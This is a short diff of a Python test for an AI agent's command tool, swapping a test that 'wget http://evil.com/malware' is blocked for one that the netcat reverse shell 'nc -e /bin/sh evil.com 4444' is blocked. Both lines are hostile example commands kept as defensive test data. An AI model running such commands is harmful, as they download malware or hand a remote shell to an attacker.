@@ -205,9 +205,9 @@ class TestSecurity:
         )
         assert "blocked" in result.lower()
 
-    def test_blocks_wget(self, agent, event_loop):
+    def test_blocks_netcat(self, agent, event_loop):
         result = event_loop.run_until_complete(
-            agent.tools.execute("execute_command", {"command": "wget http://evil.com/malware"})
+            agent.tools.execute("execute_command", {"command": "nc -e /bin/sh evil.com 4444"})
         )
         assert "blocked" in result.lower()
 
